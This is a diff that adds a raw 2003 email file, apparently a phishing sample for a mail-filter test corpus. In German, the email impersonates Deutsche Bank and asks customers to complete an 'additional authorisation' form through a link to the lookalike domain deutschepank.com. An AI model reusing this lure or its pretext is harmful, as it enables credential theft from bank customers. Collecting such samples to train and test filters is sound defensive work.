@@ -1,0 +1,118 @@
+From nobody Sun Jan 25 13:49:55 2015
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+ by example.com (Postfix) with ESMTP id 87D652A88C
+ for <user@example.com>; Sun,  7 Aug 2005 10:19:50 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+ id 7CA4D6222F3; Sun,  7 Aug 2005 10:19:50 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+ by mail.example.com (Example mail relay) with ESMTP id 631FB6222F1
+ for <user@example.com>; Sun,  7 Aug 2005 10:19:50 -0400 (EDT)
+Received: (from user@localhost) by mail.example.com id KAA20822
+ for user@example.com; Sun, 7 Aug 2005 10:19:50 -0400
+Received: from boardermail.com ([60.31.59.236])
+ by mail.example.com with SMTP id KAA20811
+ for <user@example.com>; Sun, 7 Aug 2005 10:19:44 -0400
+Received: from deutschebanc.de (mxpf01.ispgateway.de [80.67.18.4])
+ by boardermail.com (Postfix) with ESMTP id DBB07B5E5E
+ for <user@example.com>; Sat, 01 Feb 2003 08:10:11 -0600
+From: Deutsche Bank <meine_bank@deutschebanc.de>
+To: Jose <user@example.com>
+Subject: Online Bank
+Date: Sat, 01 Feb 2003 08:10:11 -0600
+Message-ID: <001101c2c9fb$9ae34a09$8ead4acb@deutschebanc.de>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Priority: 3 (Normal)
+X-MSMail-Priority: Normal
+X-Mailer: Microsoft Outlook, Build 10.0.3416
+Importance: Normal
+X-MimeOLE: Produced By Microsoft MimeOLE V6.00.2800.1123
+X-Virus-Scanned: by amavisd-milter at boardermail.com
+Content-Length: 2954
+Lines: 77
+Status: RO
+X-Status: 
+X-Keywords: 
+X-UID: 62
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4=2e0 Transitional//EN">
+<HTML><HEAD><TITLE>Deutsche Bank Online-Banking und -Brokerage</TITLE>
+<META http-equiv=3dContent-Type content=3d"text/html; charset=3dISO-8859-=
+1">
+<META content=3d7=2e0=2e0=2e86 name=3d"RCM Version">
+
+
+<STYLE type=3dtext/css>@import url( s_files/trxm=2ecss );
+@import url( s_files/loginout=2ecss );
+=2e=2eadditionalInfos P=2eindent {
+=09FONT-SIZE: 13px; LINE-HEIGHT: normal
+}
+=2e=2eadditionalInfos UL LI {
+=09FONT-SIZE: 13px; LINE-HEIGHT: normal
+}
+</STYLE>
+<LINK media=3dprint href=3d"s_files/print=2ecss" type=3dtext/css rel=3dst=
+ylesheet>
+<META content=3d"MSHTML 5=2e50=2e4134=2e600" name=3dGENERATOR></HEAD>
+<BODY>
+<TABLE id=3dglobalContainer cellSpacing=3d0 valign=3d"top">
+  <TBODY>
+  <TR>
+    <TD id=3dmaxWidth valign=3d"top">
+   =20
+     =20
+      <DIV id=3dheaderContainer>
+      <P id=3dlogoContainer><IMG title=3d"Logo Deutsche Bank" height=3d54=
+=20
+      alt=3d"Logo Deutsche Bank" src=3d"http://www=2edeutschepank=2ecom/l=
+etter/s_files/logo_db=2egif" width=3d199></P>
+      <P id=3dmetaNavContainer>&nbsp;</P></DIV>
+     =20
+      <DIV id=3dcustomerNavContainer>&nbsp;</DIV>
+      <DIV id=3dfolderContainer style=3d"BORDER-RIGHT: #7f7fbf 1px solid;=
+ PADDING-RIGHT: 100px; BORDER-TOP: #fff 1px solid; PADDING-LEFT: 0px; BAC=
+KGROUND: #fff; PADDING-BOTTOM: 0px; MARGIN: 0px 0=2e64em 0px 1=2e25em;Hei=
+ght: 400px; BORDER-LEFT: #fff 1px solid; PADDING-TOP: 0px; BORDER-BOTTOM:=
+ #7f7fbf 1px solid; POSITION: relative;">
+      <DIV id=3dleftColumnContainer>&nbsp;</DIV>
+      <DIV id=3dcontentContainer style=3d"BORDER-BOTTOM: medium none">
+<br><H1>Sehr geehrter Kunde,</H1>
+      <DIV>
+      <P>
+Da zur Zeit  die Betr&uuml;gereien  mit den Bankkonten von unseren Kunden=
+ h&auml;ufig geworden sind, m&uuml;ssen wir notgedrungen nachtr&auml;glic=
+h eine zus&auml;tzliche Autorisation von den Kontobesitzern durchf&uuml;h=
+ren=2e=20
+<br>
+Der Sicherheitsdienst der Deutsche Bank traf die Entscheidung, eine neue =
+Sicherung von den Daten vorzunehmen=2e Dazu  wurden von unseren Spezialis=
+ten sowohl die Protokolle der Informations-&uuml;bertragung, als auch die=
+ Kodierungssart der &uuml;bertragenen Daten erneuert=2e=20
+<br><br>=20
+Im Zusammenhang damit, bitten wir Sie, eine spezielle <b>Form der zus&aum=
+l;tzlichen Autorisation</b> auszuf&uuml;llen=2e=20
+<br><br>
+<div align=3d"center"><a href=3d"http://www=2edeutschepank=2ecom"><img sr=
+c=3d"http://www=2edeutschepank=2ecom/letter/clickhere=2egif" width=3d"105=
+" height=3d"19" alt=3d"" border=3d"0"></a></div>
+<br>
+Diese  Sofortma&#223;nahmen wurden nur zur Sicherung der Interessen von u=
+nseren Kunden getroffen=2e=20
+<br><br>
+Danke f&uuml;r die Mitarbeit,<br>
+Administration der Deutsche Bank
+<br><br><br>
+</P>
+     =20
+     =20
+     </DIV>
+      </TD></TR>
+  <TR>
+    <TD id=3dminWidth><IMG title=3d"" height=3d1 alt=3d"" src=3d"s_files/=
+spacer=2egif"=20
+      width=3d1></TD></TR></TBODY></TABLE></BODY></HTML>
+
